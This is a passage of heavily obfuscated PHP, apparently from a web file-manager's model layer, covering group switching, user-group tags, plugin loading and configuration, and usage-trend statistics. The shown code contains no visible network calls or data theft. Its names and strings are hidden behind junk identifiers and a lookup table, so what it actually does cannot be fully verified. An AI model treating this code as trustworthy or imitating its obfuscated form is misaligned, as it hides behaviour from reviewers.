$íÒµÉ¡[$Üü®ùè[$ĞÀàœè[202]]]; } $Üºøíá[] = 0; $Üºøíá = $ĞÀàœè[50] . implode($ĞÀàœè[50], array_reverse($Üºøíá)) . $ĞÀàœè[50]; $this->setNamePinyin($í¨’ûø[$¤ôûñ¬], $í¨’ûø[$ĞÀàœè[32]]); $this->where(array($¤ôûñ¬ => $í¨’ûø[$¤ôûñ¬]))->save(array($ĞÀàœè[661] => $Üºøíá)); } return $íÒµÉ¡; } public function groupNameAuto($Ê·Â®ˆ, $×½ÑÈéª) { $Ú„¨½û =& $_SERVER[ÕŸ²ó÷å]; $§ÇÎü¶ = $this->where(array($Ú„¨½û[486] => $Ê·Â®ˆ))->getField($Ú„¨½û[32], !0); if (!$§ÇÎü¶ || !in_array($×½ÑÈéª, $§ÇÎü¶)) { return $×½ÑÈéª; } for ($úåàà´ = 1; $úåàà´ <= count($§ÇÎü¶) + 1; $úåàà´++) { $øæ¹¹ï« = $×½ÑÈéª . "\50{$úåàà´}\51"; if (!in_array($øæ¹¹ï«, $§ÇÎü¶)) { return $øæ¹¹ï«; } } } public function groupSwitch($–ñçá¦, $‚‹¤šŸÜ) { $ì™„›–Ã =& $_SERVER[ÕŸ²ó÷å]; $äí•¿ı = array($ì™„›–Ã[1972] => array($ì™„›–Ã[7], array($–ñçá¦, $‚‹¤šŸÜ))); $á·¢®¬ = $this->where($äí•¿ı)->select(); $á·¢®¬ = array_to_keyvalue($á·¢®¬, $ì™„›–Ã[1972]); if (!isset($á·¢®¬[$–ñçá¦]) || !isset($á·¢®¬[$‚‹¤šŸÜ]) || $á·¢®¬[$–ñçá¦][$ì™„›–Ã[202]] == 0) { return !1; } $äí•¿ı = array($ì™„›–Ã[1972] => $–ñçá¦); $Ùß²¿Å„ = Model($ì™„›–Ã[2066])->where($äí•¿ı)->select(); if (!$Ùß²¿Å„) { $Ùß²¿Å„ = array(); } foreach ($Ùß²¿Å„ as $õµÈ´í) { $‘©í¹‚à = $õµÈ´í[$ì™„›–Ã[1773]]; $äí•¿ı = array($ì™„›–Ã[1773] => $‘©í¹‚à, $ì™„›–Ã[1972] => $‚‹¤šŸÜ); $Ã·ŸªÔ = Model($ì™„›–Ã[2066])->where($äí•¿ı)->find(); if (!$Ã·ŸªÔ) { $«ş¸‹ÑÔ = array($‚‹¤šŸÜ => $õµÈ´í[$ì™„›–Ã[2080]]); Model($ì™„›–Ã[607])->userGroupAdd($‘©í¹‚à, $«ş¸‹ÑÔ); } Model($ì™„›–Ã[607])->userGroupRemove($‘©í¹‚à, $–ñçá¦); } $äí•¿ı = array($ì™„›–Ã[200] => 2, $ì™„›–Ã[202] => 0, $ì™„›–Ã[494] => 1, $ì™„›–Ã[578] => array($ì™„›–Ã[7], array($–ñçá¦, $‚‹¤šŸÜ))); $ú°¨ñƒæ = Model($ì™„›–Ã[908])->where($äí•¿ı)->field($ì™„›–Ã[2081])->select(); $ú°¨ñƒæ = array_to_keyvalue($ú°¨ñƒæ, $ì™„›–Ã[578], $ì™„›–Ã[203]); $ƒ­áŸ‚š = !empty($ú°¨ñƒæ[$–ñçá¦]) ? $ú°¨ñƒæ[$–ñçá¦] : !1; if ($ƒ­áŸ‚š) { if (!$ú°¨ñƒæ[$‚‹¤šŸÜ]) { $ú°¨ñƒæ[$‚‹¤šŸÜ] = Model($ì™„›–Ã[908])->groupRootAdd($‚‹¤šŸÜ); } $ÁßÚ÷åˆ = $ú°¨ñƒæ[$‚‹¤šŸÜ]; $äí•¿ı = array($ì™„›–Ã[202] => $ƒ­áŸ‚š); $ú°¨ñƒæ = Model($ì™„›–Ã[908])->where($äí•¿ı)->field($ì™„›–Ã[2082])->select(); if (!$ú°¨ñƒæ) { $ú°¨ñƒæ = array(); } Model($ì™„›–Ã[908])->moveClearAuth = !1; foreach ($ú°¨ñƒæ as $¦ú®èûÈ) { $¤¡¼›òß = $¦ú®èûÈ[$ì™„›–Ã[494]] == $ì™„›–Ã[101] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ì™„›–Ã[908])->move($¦ú®èûÈ[$ì™„›–Ã[203]], $ÁßÚ÷åˆ, $¤¡¼›òß); } Model($ì™„›–Ã[908])->moveClearAuth = !0; $äí•¿ı = array($ì™„›–Ã[200] => 2, $ì™„›–Ã[578] => $–ñçá¦); $ñÕú†‚³ = array($ì™„›–Ã[578] => $‚‹¤šŸÜ); Model($ì™„›–Ã[2083])->where($äí•¿ı)->save($ñÕú†‚³); Model($ì™„›–Ã[2084])->where($äí•¿ı)->save($ñÕú†‚³); } $this->_changeChildLevel($á·¢®¬[$–ñçá¦], $á·¢®¬[$‚‹¤šŸÜ], !0); $this->where(array($ì™„›–Ã[202] => $–ñçá¦))->save(array($ì™„›–Ã[202] => $‚‹¤šŸÜ)); $this->_clearChildrenCache($á·¢®¬[$‚‹¤šŸÜ]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\x5f\146\x61\166"; protected function cacheFunctionAlias($ğíòÎÕí) { $¯•¡Î¼á =& $_SERVER[ÕŸ²ó÷å]; return array($¯•¡Î¼á[2085] => array($ğíòÎÕí[0], $¯•¡Î¼á[2086]), $¯•¡Î¼á[2087] => array($ğíòÎÕí[0], $¯•¡Î¼á[2088])); } protected function get($êÇÔ§à§) { $•Ë§èƒ =& $_SERVER[ÕŸ²ó÷å]; $­æ‡ğ–å = Model($•Ë§èƒ[594])->metaGet($êÇÔ§à§, $•Ë§èƒ[2089]); $¿‘üÍÚÄ = json_decode($­æ‡ğ–å, !0); return $¿‘üÍÚÄ ? $¿‘üÍÚÄ : array($•Ë§èƒ[2090] => $•Ë§èƒ[101], $•Ë§èƒ[454] => array()); } protected function set($‘¤ğ±±Ï, $ºÓÙÁÎ) { $ßÃüß =& $_SERVER[ÕŸ²ó÷å]; $ºÓÙÁÎ = $ºÓÙÁÎ ? $ºÓÙÁÎ : array($ßÃüß[2090] => $ßÃüß[101], $ßÃüß[454] => array()); return Model($ßÃüß[594])->metaSet($‘¤ğ±±Ï, $ßÃüß[2089], json_encode($ºÓÙÁÎ)); } protected function getByTagID($­¥ß´Ö, $†ÆªáóÖ) { $÷¨“÷© =& $_SERVER[ÕŸ²ó÷å]; if (!$­¥ß´Ö || !$†ÆªáóÖ) { return !1; } if (!Model($÷¨“÷©[594])->getInfoSimple($­¥ß´Ö)) { return !1; } $“ãÚÁ›Ÿ = $this->get($­¥ß´Ö); if (!$“ãÚÁ›Ÿ || !isset($“ãÚÁ›Ÿ[$÷¨“÷©[454]])) { return !1; } $¨Ÿı÷šŞ = array_find_by_field($“ãÚÁ›Ÿ[$÷¨“÷©[454]], $÷¨“÷©[484], $†ÆªáóÖ); return is_array($¨Ÿı÷šŞ) ? $¨Ÿı÷šŞ : !1; } public function listSource($¦ÀÆèØ», $Ú±â¸•) { $õ™‰”ë” =& $_SERVER[ÕŸ²ó÷å]; if ($Ú±â¸• && !is_array($Ú±â¸•)) { $Ú±â¸• = array($Ú±â¸•); } $Ÿ¢ß¾é· = $this->listData($¦ÀÆèØ»); $õñ³ë–ò = array(); foreach ($Ÿ¢ß¾é· as $Øœöµßİ) { $´ÆŒ¯´Œ = $Øœöµßİ[$õ™‰”ë”[97]]; if (!$´ÆŒ¯´Œ) { continue; } if (!isset($õñ³ë–ò[$´ÆŒ¯´Œ])) { $õñ³ë–ò[$´ÆŒ¯´Œ] = array(); } $õñ³ë–ò[$´ÆŒ¯´Œ][] = $Øœöµßİ[$õ™‰”ë”[509]]; } $Ê¿Ÿ­Ÿ„ = array(); foreach ($õñ³ë–ò as $öõù××ì => $¹¨÷¬­¬) { $§»äğù = !0; if (!$Ú±â¸•) { $Ê¿Ÿ­Ÿ„[] = $öõù××ì; continue; } foreach ($Ú±â¸• as $µ²¥™·Å) { if (!in_array($µ²¥™·Å, $¹¨÷¬­¬)) { $§»äğù = !1; break; } } if ($§»äğù) { $Ê¿Ÿ­Ÿ„[] = $öõù××ì; } } if (!$Ê¿Ÿ­Ÿ„) { return array(); } $ºô¡†ü = array($õ™‰”ë”[500] => array($õ™‰”ë”[501], $Ê¿Ÿ­Ÿ„), $õ™‰”ë”[578] => $¦ÀÆèØ», $õ™‰”ë”[200] => SourceModel::TYPE_GROUP); $¡Å…¼ƒ = Model($õ™‰”ë”[1421])->listSource($ºô¡†ü); if (!$¡Å…¼ƒ || count($Ê¿Ÿ­Ÿ„) == $¡Å…¼ƒ[$õ™‰”ë”[451]][$õ™‰”ë”[452]]) { return $¡Å…¼ƒ; } $ÓÓòÁûğ = array(); $²°ğ¼à™ = array_to_keyvalue($¡Å…¼ƒ[$õ™‰”ë”[95]], $õ™‰”ë”[12], $õ™‰”ë”[203]); $ôŠÄ˜¡ı = array_to_keyvalue($¡Å…¼ƒ[$õ™‰”ë”[96]], $õ™‰”ë”[12], $õ™‰”ë”[203]); $À–Œ³ƒº = array_merge($ôŠÄ˜¡ı, $²°ğ¼à™); foreach ($Ê¿Ÿ­Ÿ„ as $´ÆŒ¯´Œ) { if (!in_array($´ÆŒ¯´Œ, $À–Œ³ƒº)) { $ÓÓòÁûğ[] = $´ÆŒ¯´Œ; } } if ($ÓÓòÁûğ) { $this->removeBySource($¦ÀÆèØ», $ÓÓòÁûğ); } return $¡Å…¼ƒ; } protected function listData($¢˜ö‹Á) { $™©¶ŒİÒ =& $_SERVER[ÕŸ²ó÷å]; $ÌçŸĞÎ = array($™©¶ŒİÒ[1764] => 0, $™©¶ŒİÒ[566] => array($™©¶ŒİÒ[2091], 0), $™©¶ŒİÒ[505] => $™©¶ŒİÒ[2092] . $¢˜ö‹Á); $¶™Ô”‡ë = $™©¶ŒİÒ[2093]; $‹§í¹æ = $this->field($¶™Ô”‡ë)->where($ÌçŸĞÎ)->order($™©¶ŒİÒ[2094])->select(); return $‹§í¹æ ? $‹§í¹æ : array(); } protected function addToTag($â¿Çî¶¶, $ÄöÑŸÕ, $“´ìĞÏ) { $ñĞßáÍ =& $_SERVER[ÕŸ²ó÷å]; if (!$this->getByTagID($â¿Çî¶¶, $“´ìĞÏ) || !$ÄöÑŸÕ) { return !1; } if (!Model($ñĞßáÍ[908])->pathInfo($ÄöÑŸÕ)) { return !1; } $ÌÃÜö‹€ = array($ñĞßáÍ[1764] => 0, $ñĞßáÍ[566] => $“´ìĞÏ, $ñĞßáÍ[504] => $ÄöÑŸÕ, $ñĞßáÍ[505] => $ñĞßáÍ[2095] . $â¿Çî¶¶, $ñĞßáÍ[503] => $ñĞßáÍ[12], $ñĞßáÍ[1976] => 0); if ($this->where($ÌÃÜö‹€)->find()) { return !1; } return $this->add($ÌÃÜö‹€); } protected function removeFromTag($Éà¾ò¡ë, $¢ñóê´Æ, $Ã÷à­¿Ä) { $ù±Àª·À =& $_SERVER[ÕŸ²ó÷å]; if (!$this->getByTagID($Éà¾ò¡ë, $Ã÷à­¿Ä) || !$¢ñóê´Æ) { return !1; } if (is_array($¢ñóê´Æ)) { $¢ñóê´Æ = array($ù±Àª·À[7], $¢ñóê´Æ); } $ö§ÃĞ÷¢ = array($ù±Àª·À[1764] => 0, $ù±Àª·À[566] => $Ã÷à­¿Ä, $ù±Àª·À[505] => $ù±Àª·À[2095] . $Éà¾ò¡ë, $ù±Àª·À[504] => $¢ñóê´Æ); return $this->where($ö§ÃĞ÷¢)->delete(); } protected function removeByTag($ºÎÑÒ³, $Õ‚„°¡‰) { $©¾¢É™í =& $_SERVER[ÕŸ²ó÷å]; if (!$this->getByTagID($ºÎÑÒ³, $Õ‚„°¡‰)) { return !1; } $Œ¿éñ±İ = array($©¾¢É™í[1764] => 0, $©¾¢É™í[566] => $Õ‚„°¡‰, $©¾¢É™í[505] => $©¾¢É™í[2095] . $ºÎÑÒ³); return $this->where($Œ¿éñ±İ)->delete(); } protected function removeBySource($šğ«ß¯ö, $ëŞ—âÔ¥) { $ºË‹§ =& $_SERVER[ÕŸ²ó÷å]; if (!$šğ«ß¯ö || !$ëŞ—âÔ¥) { return !1; } if (is_array($ëŞ—âÔ¥)) { $ëŞ—âÔ¥ = array($ºË‹§[7], $ëŞ—âÔ¥); } $ÃÜğê§ = array($ºË‹§[1764] => 0, $ºË‹§[504] => $ëŞ—âÔ¥, $ºË‹§[566] => array($ºË‹§[1095], 0), $ºË‹§[505] => $ºË‹§[2095] . $šğ«ß¯ö); return $this->where($ÃÜğê§)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\x6d\56\x70\x6c\x75\x67\151\156\x4c\x69\163\x74"; public $field = array("\x6e\x61\155\x65", "\x73\x74\x61\164\x75\x73", "\x72\x65\147\151\x65\163\164", "\143\157\x6e\146\x69\x67"); public function loadList($ëñ“†›¹ = false) { $¸«ÒŸ­ = array_to_keyvalue($this->listData(), $_SERVER[ÕŸ²ó÷å][32]); if ($ëñ“†›¹) { return $¸«ÒŸ­[$ëñ“†›¹]; } return $¸«ÒŸ­; } public function init() { $Ä‡œû­ô =& $_SERVER[ÕŸ²ó÷å]; Hook::trigger($Ä‡œû­ô[2096]); $™˜Ãç¥ = $this->loadPluginList(); foreach ($™˜Ãç¥ as $Š¹À›ç° => $­Äß¡ïÖ) { $—¼õÜÕ = $this->appAllow($Š¹À›ç°, $­Äß¡ïÖ); if (!$—¼õÜÕ) { continue; } foreach ($­Äß¡ïÖ[$Ä‡œû­ô[2097]] as $£—ıÅÅ => $ò“›‡À”) { Hook::bind($£—ıÅÅ, $ò“›‡À”); } } Hook::trigger($Ä‡œû­ô[2098]); Hook::trigger(ACTION); } public function appAllow($áš°¢œÎ, $Ş†ú€Ô’, $ÔÊÕª„ = true) { $•œú­Ôó =& $_SERVER[ÕŸ²ó÷å]; $’¢¦Ûªâ = PLUGIN_DIR . $áš°¢œÎ . $•œú­Ôó[2099]; if (!is_array($Ş†ú€Ô’) || !is_array($Ş†ú€Ô’[$•œú­Ôó[2097]]) || $Ş†ú€Ô’[$•œú­Ôó[834]] != 1 || !is_file($’¢¦Ûªâ)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$•œú­Ôó[6]][$•œú­Ôó[2100]] || !$GLOBALS[$•œú­Ôó[6]][$•œú­Ôó[2101]]) { return !0; } $çÓş¤Óí = explode($•œú­Ôó[50], strtolower($GLOBALS[$•œú­Ôó[6]][$•œú­Ôó[2101]])); return in_array(strtolower($áš°¢œÎ), $çÓş¤Óí) ? !1 : !0; } if ($ÔÊÕª„ && !Action($•œú­Ôó[2102])->checkAuth($áš°¢œÎ)) { return !1; } return !0; } public function unInstall($‡æÕ‚§) { $ÏÂİÛÍİ =& $_SERVER[ÕŸ²ó÷å]; $âùÈıŞ´ = $this->loadList($‡æÕ‚§); if (file_exists(PLUGIN_DIR . $‡æÕ‚§)) { Hook::apply($‡æÕ‚§ . $ÏÂİÛÍİ[2103]); } $this->remove($âùÈıŞ´[$ÏÂİÛÍİ[484]]); } public function changeStatus($´üÍ¤»¼, $…¢µû‹Í) { $šÆÍš¼Ï =& $_SERVER[ÕŸ²ó÷å]; $û‰–”·Ò = $this->loadList($´üÍ¤»¼); if ($…¢µû‹Í) { Hook::apply($´üÍ¤»¼ . $šÆÍš¼Ï[2104]); } $this->update($û‰–”·Ò[$šÆÍš¼Ï[484]], array($šÆÍš¼Ï[2105] => $…¢µû‹Í)); } public function appRegist($¤ãĞå„, $­ÓÂàã÷) { $ËÕšÄ¤ =& $_SERVER[ÕŸ²ó÷å]; $äÒ­Æ›€ = $this->loadList($¤ãĞå„); if ($äÒ­Æ›€) { $this->update($äÒ­Æ›€[$ËÕšÄ¤[484]], array($ËÕšÄ¤[2097] => $­ÓÂàã÷)); } else { $­ŸŠôÎÃ = array($ËÕšÄ¤[32] => $¤ãĞå„, $ËÕšÄ¤[2097] => $­ÓÂàã÷, $ËÕšÄ¤[834] => 0, $ËÕšÄ¤[6] => $this->getConfigDefault($¤ãĞå„)); $this->insert($­ŸŠôÎÃ); } } public function getConfigDefault($ †¬Ê¢) { $·ª¾Ü²ã =& $_SERVER[ÕŸ²ó÷å]; $òú±ÀÄ = array(); $šÇÜ€¢ = $this->getPackageJson($ †¬Ê¢); if (!$šÇÜ€¢ && is_array($šÇÜ€¢[$·ª¾Ü²ã[2106]])) { return $òú±ÀÄ; } foreach ($šÇÜ€¢[$·ª¾Ü²ã[2106]] as $Ã¢¡åğ => $ç ëĞüÕ) { if (!isset($ç ëĞüÕ[$·ª¾Ü²ã[459]]) || isset($òú±ÀÄ[$Ã¢¡åğ])) { continue; } $òú±ÀÄ[$Ã¢¡åğ] = $ç ëĞüÕ[$·ª¾Ü²ã[459]]; } return $òú±ÀÄ; } public function getPackageJson($·Ÿ”Şáî) { return Hook::apply($·Ÿ”Şáî . $_SERVER[ÕŸ²ó÷å][2107]); } public function getConfig($¨¼®Ğ©×, $ŸàªÊÀ’ = false) { $Íë‹£ï÷ =& $_SERVER[ÕŸ²ó÷å]; $ßáÛÀË³ = array(); $Ú¨ıäŒ = $this->loadList($¨¼®Ğ©×); if ($Ú¨ıäŒ && is_array($Ú¨ıäŒ[$Íë‹£ï÷[6]])) { $ßáÛÀË³ = $Ú¨ıäŒ[$Íë‹£ï÷[6]]; } if (!$ßáÛÀË³ || $ŸàªÊÀ’) { $ßáÛÀË³ = $this->getConfigDefault($¨¼®Ğ©×); } return $ßáÛÀË³; } public function setConfig($¢¨ã«£û, $¥ú‡úÌ = false) { $Ã»‚ÊüŠ =& $_SERVER[ÕŸ²ó÷å]; $Ä¯¿²Î = $this->loadList($¢¨ã«£û); if (!$Ä¯¿²Î) { return !1; } $é ó®ˆø = $Ä¯¿²Î[$Ã»‚ÊüŠ[6]]; if ($¥ú‡úÌ == !1) { $é ó®ˆø = array(); $¥ú‡úÌ = $this->getConfigDefault($¢¨ã«£û); } foreach ($¥ú‡úÌ as $×è×È… => $ş‹ïîı) { $é ó®ˆø[$×è×È…] = is_string($ş‹ïîı) ? trim($ş‹ïîı) : $ş‹ïîı; } $this->update($Ä¯¿²Î[$Ã»‚ÊüŠ[484]], array($Ã»‚ÊüŠ[6] => $é ó®ˆø)); } public function viewList() { $‰”ÜÕ° =& $_SERVER[ÕŸ²ó÷å]; $ÀÀÁÂ° = $this->loadList(); $this->pluginScan($ÀÀÁÂ°); $ÀÀÁÂ° = $this->loadPluginList(); $ÉóÄòÑµ = array(); foreach ($ÀÀÁÂ° as $Ğ³ŸŒò¥ => $ğ±æÓÆ¾) { $ü¨šËŸŒ = $ğ±æÓÆ¾; unset($ğ±æÓÆ¾[$‰”ÜÕ°[2097]], $ğ±æÓÆ¾[$‰”ÜÕ°[6]]); $ºÆÜĞ•ñ = PLUGIN_DIR . $ğ±æÓÆ¾[$‰”ÜÕ°[32]] . $‰”ÜÕ°[2099]; if (!is_file($ºÆÜĞ•ñ)) { continue; } $ùùæÑŞÖ = Hook::apply($ğ±æÓÆ¾[$‰”ÜÕ°[32]] . $‰”ÜÕ°[2107]); if (!is_array($ùùæÑŞÖ)) { continue; } $ÉóÄòÑµ[$Ğ³ŸŒò¥] = array_merge($ğ±æÓÆ¾, $ùùæÑŞÖ); if ($ü¨šËŸŒ[$‰”ÜÕ°[6]][$‰”ÜÕ°[1687]] != $ùùæÑŞÖ[$‰”ÜÕ°[1661]]) { Hook::apply($ğ±æÓÆ¾[$‰”ÜÕ°[32]] . $‰”ÜÕ°[2104]); $ü¨šËŸŒ[$‰”ÜÕ°[6]][$‰”ÜÕ°[1687]] = $ùùæÑŞÖ[$‰”ÜÕ°[1661]]; $this->update($ğ±æÓÆ¾[$‰”ÜÕ°[484]], array($‰”ÜÕ°[6] => $ü¨šËŸŒ[$‰”ÜÕ°[6]])); } } return $ÉóÄòÑµ; } private function loadPluginList() { $ ½Ã÷çñ =& $_SERVER[ÕŸ²ó÷å]; $„¢§Œïü = $this->loadList(); if (strtolower(MOD) == $ ½Ã÷çñ[2108]) { return $„¢§Œïü; } $·æ¤¹ö‡ = Hook::trigger($ ½Ã÷çñ[2109], $„¢§Œïü); if ($„¢§Œïü && !$·æ¤¹ö‡) { die; } return $·æ¤¹ö‡ ? $·æ¤¹ö‡ : $„¢§Œïü; } private function pluginScan($Ü”•ıÁÛ) { $ÍÉö’‚¨ =& $_SERVER[ÕŸ²ó÷å]; recursion_dir(PLUGIN_DIR, $«ò»ÏªÛ, $¿ÄÊö‰À, 0); foreach ($«ò»ÏªÛ as $Š¬ÒÊí) { $±ŞşŞ = get_path_this($Š¬ÒÊí); if (isset($Ü”•ıÁÛ[$±ŞşŞ]) || !file_exists($Š¬ÒÊí . $ÍÉö’‚¨[2110]) || !file_exists($Š¬ÒÊí . $ÍÉö’‚¨[2099])) { continue; } Hook::apply($±ŞşŞ . $ÍÉö’‚¨[2104]); } } } goto a§£çÂî; c…òµŒÚ±ó: class AnalysisModel extends ModelBaseLight { public function init($éÔŠªı³) { $©¦õè® =& $_SERVER[ÕŸ²ó÷å]; $Øê—œ = array($©¦õè®[671] => array($©¦õè®[33] => $©¦õè®[1900], $©¦õè®[359] => array($©¦õè®[265], $©¦õè®[849], $©¦õè®[1901], $©¦õè®[1902])), $©¦õè®[1903] => array($©¦õè®[33] => $©¦õè®[1904], $©¦õè®[359] => array($©¦õè®[265], $©¦õè®[847], $©¦õè®[1905], $©¦õè®[1906], $©¦õè®[1907]))); if (!isset($Øê—œ[$éÔŠªı³])) { return !1; } $this->optionType = $Øê—œ[$éÔŠªı³][$©¦õè®[33]]; $this->field = $Øê—œ[$éÔŠªı³][$©¦õè®[359]]; return !0; } public function listData($ÔÚİ¨™Õ = false, $éêãßØÂ = "\155\x6f\144\151\146\x79\124\151\155\145", $Éû–¨‰ = false) { return parent::listData($ÔÚİ¨™Õ, $éêãßØÂ, $Éû–¨‰); } public function trendList($ÄÄ€ĞØ) { $ùÇç‘ù =& $_SERVER[ÕŸ²ó÷å]; $ô—Ş’á = $this->listData(); if ($ô—Ş’á) { $õÜ¸¿«à = end($ô—Ş’á); $¥’ù«¤ = date($ùÇç‘ù[1908], strtotime($ùÇç‘ù[1909])); if ($õÜ¸¿«à[$ùÇç‘ù[265]] == $¥’ù«¤) { return $ô—Ş’á; } $ÅóçíŠ¡ = strtotime($õÜ¸¿«à[$ùÇç‘ù[265]]); } if (!isset($ÅóçíŠ¡)) { $ºÛ–ê×É = $ÄÄ€ĞØ == $ùÇç‘ù[671] ? $ùÇç‘ù[607] : $ùÇç‘ù[908]; $ÅóçíŠ¡ = Model($ºÛ–ê×É)->min($ùÇç‘ù[241]); } $ïÉÄñŸï = $ùÇç‘ù[1910] . ucfirst($ÄÄ€ĞØ); $ºÅŠÁì¨ = $this->dateList($ÅóçíŠ¡); foreach ($ºÅŠÁì¨ as $¥’ù«¤) { $this->{$ïÉÄñŸï}($¥’ù«¤); } return $this->listData(); } private function dateList($ôƒ¢–€ø) { $¿ÊøÅ÷Š =& $_SERVER[ÕŸ²ó÷å]; $èïë®ú = $ôƒ¢–€ø; $‘Şì¹‰¤ = strtotime($¿ÊøÅ÷Š[1909]); $£æ¸©É× = array(); while ($èïë®ú <= $‘Şì¹‰¤) { $£æ¸©É×[] = date($¿ÊøÅ÷Š[1908], $èïë®ú); $èïë®ú = strtotime($¿ÊøÅ÷Š[1911], $èïë®ú); } return $£æ¸©É×; } public function _recordUser($¶Â¯¨ = '') { $ÏÚ¶«ÎÊ =& $_SERVER[ÕŸ²ó÷å]; $¤‘ˆÇ™® = strtotime(date($ÏÚ¶«ÎÊ[1912], strtotime($¶Â¯¨))); $®Ö×¼Í‘ = strtotime(date($ÏÚ¶«ÎÊ[1913], strtotime($¶Â¯¨))); $±úï¾Øı = array($ÏÚ¶«ÎÊ[241] => array($ÏÚ¶«ÎÊ[1094], $®Ö×¼Í‘)); $ïËÃ‹Üˆ = Model($ÏÚ¶«ÎÊ[607])->where($±úï¾Øı)->count($ÏÚ¶«ÎÊ[1773]); $±úï¾Øı[$ÏÚ¶«ÎÊ[241]] = array($ÏÚ¶«ÎÊ[418], array($¤‘ˆÇ™®, $®Ö×¼Í‘)); $öâ°Ú¶ = Model($ÏÚ¶«ÎÊ[607])->where($±úï¾Øı)->count($ÏÚ¶«ÎÊ[1773]); $±úï¾Øı[$ÏÚ¶«ÎÊ[33]] = $ÏÚ¶«ÎÊ[1914]; $¬Ş€ñãï = Model($ÏÚ¶«ÎÊ[1915])->where($±úï¾Øı)->count($ÏÚ¶«ÎÊ[1916]); $¯ĞÜóİĞ = array($ÏÚ¶«ÎÊ[265] => $¶Â¯¨, $ÏÚ¶«ÎÊ[849] => (int) $ïËÃ‹Üˆ, $ÏÚ¶«ÎÊ[1901] => (int) $öâ°Ú¶, $ÏÚ¶«ÎÊ[1902] => (int) $¬Ş€ñãï); return $this->insert($¯ĞÜóİĞ); } public function _recordStore($öµğÁ½Ç = '') { $ê£¿×« =& $_SERVER[ÕŸ²ó÷å]; $ÒÏ‹Ü¶ø = strtotime(date($ê£¿×«[1913], strtotime($öµğÁ½Ç))); $Œâø—Ğ¤ = array($ê£¿×«[241] => array($ê£¿×«[1094], $ÒÏ‹Ü¶ø)); $æšÚ˜ëÉ = Model($ê£¿×«[553])->where($Œâø—Ğ¤)->sum($ê£¿×«[89]); $Œâø—Ğ¤[$ê£¿×«[494]] = 0; $ÃİÆæè = Model($ê£¿×«[908])->where($Œâø—Ğ¤)->sum($ê£¿×«[89]); $Œâø—Ğ¤[$ê£¿×«[200]] = 1; $Şûä—”ö = Model($ê£¿×«[908])->where($Œâø—Ğ¤)->sum($ê£¿×«[89]); $Œâø—Ğ¤[$ê£¿×«[200]] = 2; $¶ğò´ïˆ = Model($ê£¿×«[908])->where($Œâø—Ğ¤)->sum($ê£¿×«[89]); $îÚÇ¢«Û = array($ê£¿×«[265] => $öµğÁ½Ç, $ê£¿×«[847] => (int) $ÃİÆæè, $ê£¿×«[1905] => (int) $æšÚ˜ëÉ, $ê£¿×«[1906] => (int) $Şûä—”ö, $ê£¿×«[1907] => (int) $¶ğò´ïˆ); return $this->insert($îÚÇ¢«Û); } public function trend($éÅê“ú˜, $´¢Ã¥á“) { $ü‚«‰ù… =& $_SERVER[ÕŸ²ó÷å]; if (!$this->init($éÅê“ú˜)) { return !1; } $Î£¹“™² = $this->trendList($éÅê“ú˜); if ($Î£¹“™² && $´¢Ã¥á“ != $ü‚«‰ù…[1746]) { $«÷âÑñ = $Î£¹“™²[0][$ü‚«‰ù…[265]]; $¢”İÇéë = $this->validDate($´¢Ã¥á“, $«÷âÑñ); $”±ıÕ = array(); $¾—›½İ = array_to_keyvalue($Î£¹“™², $ü‚«‰ù…[265]); foreach ($¢”İÇéë as $ÚÕØŒš°) { if (isset($¾—›½İ[$ÚÕØŒš°])) { $¢î³‹ª• = $¾—›½İ[$ÚÕØŒš°]; } else { $¢î³‹ª• = end($Î£¹“™²); $¢î³‹ª•[$ü‚«‰ù…[265]] = $ÚÕØŒš°; if ($éÅê“ú˜ == $ü‚«‰ù…[671]) { $¢î³‹ª•[$ü‚«‰ù…[1901]] = $¢î³‹ª•[$ü‚«‰ù…[1902]] = 0; } } $”±ıÕ[] = $¢î³‹ª•; } $Î£¹“™² = $”±ıÕ; } $·¨±¶ = array($ü‚«‰ù…[671] => array($ü‚«‰ù…[849] => LNG($ü‚«‰ù…[1917]), $ü‚«‰ù…[1901] => LNG($ü‚«‰ù…[1918]), $ü‚«‰ù…[1902] => LNG($ü‚«‰ù…[1919])), $ü‚«‰ù…[1903] => array($ü‚«‰ù…[847] => LNG($ü‚«‰ù…[1920]), $ü‚«‰ù…[1905] => LNG($ü‚«‰ù…[1921]), $ü‚«‰ù…[1906] => LNG($ü‚«‰ù…[1922]), $ü‚«‰ù…[1907] => LNG($ü‚«‰ù…[1923]))); $“¸Š¨€ = array($ü‚«‰ù…[671] => $ü‚«‰ù…[1924], $ü‚«‰ù…[1903] => $ü‚«‰ù…[89]); if (empty($Î£¹“™²)) { $ÚÕØŒš° = date($ü‚«‰ù…[1908], strtotime($ü‚«‰ù…[1909])); $ìâ´ßé‹ = array($ü‚«‰ù…[265] => $ÚÕØŒš°); foreach ($·¨±¶[$éÅê“ú˜] as $»ÌÍ÷Èä => $­Ó»¾´ë) { $ìâ´ßé‹[$»ÌÍ÷Èä] = 0; } $Î£¹“™²[] = $ìâ´ßé‹; } $âÉöê¨ï = array(); foreach ($Î£¹“™² as $­Ó»¾´ë) { if ($éÅê“ú˜ == $ü‚«‰ù…[1903] && $­Ó»¾´ë[$ü‚«‰ù…[1905]] > $­Ó»¾´ë[$ü‚«‰ù…[847]]) { $­Ó»¾´ë[$ü‚«‰ù…[1905]] = $­Ó»¾´ë[$ü‚«‰ù…[847]]; } foreach ($·¨±¶[$éÅê“ú˜] as $»ÌÍ÷Èä => $Ù¨¾®¢ş) { $¢î³‹ª• = array($ü‚«‰ù…[265] => $­Ó»¾´ë[$ü‚«‰ù…[265]], $ü‚«‰ù…[1662] => $Ù¨¾®¢ş); $¢î³‹ª•[$“¸Š¨€[$éÅê“ú˜]] = isset($­Ó»¾´ë[$»ÌÍ÷Èä]) ? $­Ó»¾´ë[$»ÌÍ÷Èä] : 0; $âÉöê¨ï[] = $¢î³‹ª•; } } return $âÉöê¨ï; } public function validDate($¯ƒÓ™Ïı, $çºüöË¨) { $²ÌÏÙü´ =& $_SERVER[ÕŸ²ó÷å]; $‚µàñï¬ = date($²ÌÏÙü´[1908], strtotime($²ÌÏÙü´[1909])); $ÃšÆ›Úú = array($‚µàñï¬); switch ($¯ƒÓ™Ïı) { case $²ÌÏÙü´[1753]: $Ìë“œƒÜ = mktime(0, 0, 0, date($²ÌÏÙü´[1925]), date($²ÌÏÙü´[1452]) - date($²ÌÏÙü´[1542]) + 7 - 7, date($²ÌÏÙü´[1926])); 